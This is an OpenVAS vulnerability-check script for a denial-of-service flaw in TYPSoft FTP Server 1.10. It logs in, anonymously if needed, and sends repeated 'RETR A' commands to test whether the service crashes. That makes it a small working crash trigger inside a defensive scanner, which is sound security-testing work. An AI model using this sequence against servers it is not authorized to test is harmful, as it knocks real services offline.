###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typsoft_ftp_server_retr_dos_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to cause
a denial of service.

Impact Level: Application";

tag_affected = "TYPSoft FTP Server Version 1.10";

tag_insight = "The flaw is due to an error in handling the RETR command,
which can  be exploited to crash the FTP service by sending multiple RETR
commands.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running TYPSoft FTP Server and is prone to denial
of service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801687");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2005-3294");
  script_bugtraq_id(15104);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("TYPSoft FTP Server RETR CMD Denial Of Service Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/17196");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15860/");
  script_xref(name : "URL" , value : "http://www.exploitlabs.com/files/advisories/EXPL-A-2005-016-typsoft-ftpd.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("ftp_func.inc");

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(! get_port_state(ftpPort)){
  exit(0);
}

# Get the FTP banner
banner = get_ftp_banner(port:ftpPort);
if("TYPSoft FTP Server" >!< banner){
  exit(0);
}

## Open FTP Socket
soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

# Check for the user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user
if(!user){
  user = "anonymous";
  pass = "openvas@";
}

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(login_details)
{
  for(i=0; i<5; i++)
  {
    ## Sending Attack
    response = ftp_send_cmd(socket:soc, cmd:"RETR A");

    ## Check Socket status
    if(! response)
    {
      security_message(port:ftpPort);
      exit(0);
    }
  }
}
ftp_close(socket:soc);
